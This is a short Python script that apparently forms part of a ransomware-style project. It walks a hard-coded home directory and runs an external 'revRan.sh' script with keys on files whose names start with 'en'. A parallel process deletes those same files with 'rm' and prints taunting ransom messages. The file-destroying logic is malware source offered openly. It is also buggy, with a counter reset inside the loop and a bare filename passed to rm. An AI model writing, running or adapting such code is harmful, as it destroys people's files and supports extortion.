import os
import multiprocessing
from file import ac_n

def ransom1():
    for x, y, z in os.walk("/home/potmor/Desktop/Github"):
        for i in z:
            j = 0
            if i[:2] != "en":
                continue
            else:
                try:
                    os.system(f"./revRan.sh {i} {ac_n[j]}")
                except KeyboardInterrupt:
                    ransom1()
            j += 1
    print("RANSOM COMPLETE")
def ransom2():
    from time import sleep
    sleep(0.5)
    for x, y, z in os.walk("/home/potmor/Desktop/Github"):
        for i in z:
            if i[:2] == "en":
                os.system(f"rm {i}")
    print("TWAZ A PLEASURE WORKING WITH YOU: ")
    
p1 = multiprocessing.Process(target = ransom1)
p2 = multiprocessing.Process(target = ransom2)
p1.start()
p2.start()
p1.join()
p2.join()